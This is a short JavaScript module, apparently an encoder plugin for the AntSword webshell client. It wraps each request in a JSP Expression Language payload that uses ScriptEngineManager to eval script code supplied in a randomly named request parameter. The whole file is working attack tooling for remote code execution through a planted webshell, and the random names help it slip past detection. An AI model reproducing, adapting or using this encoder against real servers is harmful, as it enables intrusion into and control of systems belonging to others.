'use strict';

module.exports = (pwd, data, ext = null) => {
  let randomID;
  if (ext.opts.otherConf['use-random-variable'] === 1) {
      randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
  } else {
      randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
  }
  data[pwd] = `\${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(pageContext.request.getParameter("${randomID}"))}`;
  data[randomID]=data['_'];
  delete data['_'];
  return data;
}
